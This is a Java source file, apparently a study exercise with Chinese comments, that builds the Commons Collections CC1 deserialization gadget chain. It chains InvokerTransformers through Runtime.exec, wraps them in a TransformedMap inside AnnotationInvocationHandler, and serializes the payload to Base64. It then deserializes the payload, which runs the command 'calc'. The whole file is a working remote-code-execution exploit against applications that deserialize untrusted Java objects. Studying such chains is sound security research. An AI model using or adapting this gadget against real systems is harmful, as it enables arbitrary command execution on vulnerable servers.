package org.example;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.Map;
import org.apache.commons.collections.map.HashedMap;

import java.nio.charset.StandardCharsets;
import java.util.Base64;
public class CC1TransformedMap {
    public static void main(String[] args) throws Exception {


//        Runtime r=Runtime.getRuntime();
        //Runtime没有继承Serializable，无法被序列化，需要通过Runtime的原型来反射调用getRuntime
//        Class rc=Class.forName("java.lang.Runtime");
//        Method getRuntime=rc.getDeclaredMethod("getRuntime");
//        Runtime r=(Runtime)getRuntime.invoke(null,null);
//        Method exec=rc.getDeclaredMethod("exec", String.class);
        //exec.invoke(r,"calc");

        //用InvokerTransformer来触发调用exec
//        Method getRuntime=(Method)new InvokerTransformer("getDeclaredMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}).transform(Runtime.class);
//        Runtime r=(Runtime)new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}).transform(getRuntime);
//        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(r);
        //使用ChainedTransformer将上述过程进行串联
        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
//        chainedTransformer.transform(Runtime.class);


//        invokerTransformer.transform(r);
        HashedMap map=new HashedMap();
        map.put("value","cc1");
        Map<Object,Object> transformedMap=TransformedMap.decorate(map,null,chainedTransformer);
        //setValue可以触发checkSetValue
        //checkSetValue可以触发transform函数
        //transform可以触发反射执行任意命令

//        for(Map.Entry entry: transformedMap.entrySet() ){
//            entry.setValue(r);
//        }

        //获取类能够通过readObejct触发setValue
        Class c=Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor=c.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object o=constructor.newInstance(Target.class,transformedMap);
//base64
        ByteArrayOutputStream buffer=new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream=new ObjectOutputStream(buffer);
        objectOutputStream.writeObject(o);
        String data = Base64.getEncoder().encodeToString(buffer.toByteArray());
        System.out.println(data);

        byte[] bytes=Base64.getDecoder().decode(data.getBytes(StandardCharsets.UTF_8));
        ByteArrayInputStream b = new ByteArrayInputStream(bytes);
        ObjectInputStream input = new ObjectInputStream(b);
        input.readObject();

// 写文件
//        //序列化
//        ObjectOutputStream objectOutputStream=new ObjectOutputStream(new FileOutputStream("./cc1.txt"));
//        objectOutputStream.writeObject(o);
//        objectOutputStream.close();
//        //反序列化
//        ObjectInputStream objectInputStream=new ObjectInputStream(new FileInputStream("./cc1.txt"));
//        objectInputStream.readObject();
    }
}